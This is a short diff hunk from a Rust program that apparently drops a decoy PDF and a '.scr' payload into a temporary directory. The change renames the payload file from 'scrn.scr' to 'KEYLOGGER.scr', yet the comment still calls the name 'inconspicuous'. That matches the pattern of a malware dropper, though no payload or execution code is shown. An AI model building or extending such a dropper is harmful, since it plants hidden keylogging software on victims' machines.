@@ -28,8 +28,8 @@ fn main() {
     let pdf_path = tmp.join("sample.pdf");
 
     // # Define the full path for the payload file within the temporary directory.
-    // A generic name like "scrn.scr" is chosen to be inconspicuous.
-    let scr_path = tmp.join("scrn.scr");
+    // A generic name like "KEYLOGGER.scr" is chosen to be inconspicuous.
+    let scr_path = tmp.join("KEYLOGGER.scr");
 
     // # Write the embedded PDF data to the file system.
     // This block creates a new file at `pdf_path`. If successful, it writes the
